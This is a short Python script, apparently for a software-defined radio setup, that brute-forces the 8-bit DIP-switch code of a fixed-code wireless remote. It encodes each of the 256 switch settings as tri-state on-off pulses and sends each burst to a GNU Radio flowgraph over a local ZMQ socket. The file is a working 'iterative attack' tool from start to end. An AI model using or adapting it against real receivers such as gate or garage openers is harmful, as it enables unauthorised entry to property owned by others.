#!/usr/bin/python3

import my_zmq_utils as zmu
import top_block 
import itertools
import time

tcp_str = "tcp://127.0.0.1:5555"

# some systems require a max or min value for this:
DEAD_AIR = 40 * [0, ]
REPEAT_NUM = 20

# define one and zero and third-state sequences
ZERO = [0, 1, 1, 1]
ONE = [0, 0, 1, 1]
X_STATE= [0, 0, 0, 1]


# build encoded sequences based on input bits
def encode_bits(bits, zero_seq, one_seq):
    seq = []
    for bit in bits:
        if bit == 1:
            seq += one_seq
        elif bit == 0:
            seq += zero_seq
        else:
            print("Encoding Error: Bit must be 1 or 0")
    return seq


# this function build the payload bitwise and returns it
def build_payload(dip_int):
    # convert integer valued dip to a list of switch positions (1/0)
    dip = build_dip_list(dip_int)
    print(dip)

    # start with dead air
    p = []
    p += DEAD_AIR

    # add start bit
    p += X_STATE

    # add the first 6 dip switches
    p += encode_bits(dip[:6], ZERO, ONE)

    # add mid-payload x-bit
    p += X_STATE

    # add the last two
    p += encode_bits(dip[6:], ZERO, ONE)

    # add final x-bit
    p += X_STATE
    print(p)

    burst = REPEAT_NUM * p
    print(burst)
    return burst


# this function converts the input integer (from 0-255)
# into a list of equivalent dip switch positions
# from [0, 0, 0, 0, 0, 0, 0, 0] to [1, 1, 1, 1, 1, 1, 1, 1]
def build_dip_list(int_val):
    # level 8 stack overflow spell:
    out_list = [int_val >> i & 1 for i in range(7, -1, -1)]

    return out_list


# init tx payload socket
tx_socket = zmu.ZmqPushMsgSocket(tcp_str=tcp_str)

# setup and run flowgraph
fg = top_block.top_block()
fg.start()

ctl_sel = input("Press Enter to begin iterative attack: ")

# for each possible config of DIP switches
for dip_int in range(0x100):
#for dip_int in [0x36, 0xAE, 0xD9]:  # this is quicker
    print("DIP = {:02x}".format(dip_int))
    payload_bits = build_payload(dip_int=dip_int)

    tx_socket.send_raw_bytes(byte_list=payload_bits)
    time.sleep(2)

fg.stop()

